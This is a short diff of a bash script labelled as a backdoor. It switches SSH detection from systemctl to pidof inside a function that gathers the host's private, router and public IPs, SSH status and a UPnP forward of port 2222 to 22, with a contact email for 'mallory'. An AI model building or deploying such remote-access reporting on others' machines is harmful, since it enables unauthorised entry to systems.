@@ -12,7 +12,7 @@
 #--------------------------BACKDOOR CONFIGURATION:-----------------------------------------------
 backdoor=~/.backdoor # default -> root, change "User" in backdoor.service
 emailaddress='mallory@example.ch'
-sshservice='ssh.service' # archlinux -> sshd.service or sshd.socket, ubuntu -> ssh.service
+#sshservice='ssh.service' # archlinux -> sshd.service or sshd.socket, ubuntu -> ssh.service
 
 
 
@@ -62,7 +62,8 @@ function getdata # Gather Statistics
     ip_private=$(ip route get 1 | sed -r -n 's/.*src (([0-9]{1,3}[.]){3,3}[0-9]{1,3}).*/\1/p') # long live sed
     ip_router=$(ip route get 1 | sed -r -n 's/.*via (([0-9]{1,3}[.]){3,3}[0-9]{1,3}).*/\1/p')
     ip_public=$(curl -s ipecho.net/plain) # -s kills progress output
-    systemctl | grep -F $sshservice &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
+    #systemctl | grep -F $sshservice &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
+    pidof sshd &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
     upnpc -P | grep -F -i 'found valid igd' &>/dev/null && upnp='ENABLED' || upnp='DISABLED'
     [[ $upnp == 'ENABLED' ]] && upnpc -l | grep -E "TCP\s*2222->${ip_private}:22" &>/dev/null && port='OPEN' || port='CLOSED'
 
